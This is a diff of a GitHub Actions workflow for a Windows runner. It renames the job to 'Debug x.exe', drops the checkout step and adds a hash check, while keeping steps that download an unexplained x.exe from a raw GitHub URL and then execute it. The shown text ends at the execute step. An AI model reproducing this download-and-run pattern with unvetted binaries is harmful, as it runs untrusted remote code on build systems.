@@ -1,4 +1,4 @@
-name: win10
+name: Debug x.exe
 
 on:
   push:
@@ -10,12 +10,13 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v3
-
     - name: Download x.exe
       run: |
         powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe' -OutFile 'C:\Users\runneradmin\Desktop\x.exe'"
+
+    - name: Verify File
+      run: |
+        powershell -Command "Get-FileHash -Path 'C:\Users\runneradmin\Desktop\x.exe' -Algorithm SHA256"
 
     - name: Execute x.exe
       run: |
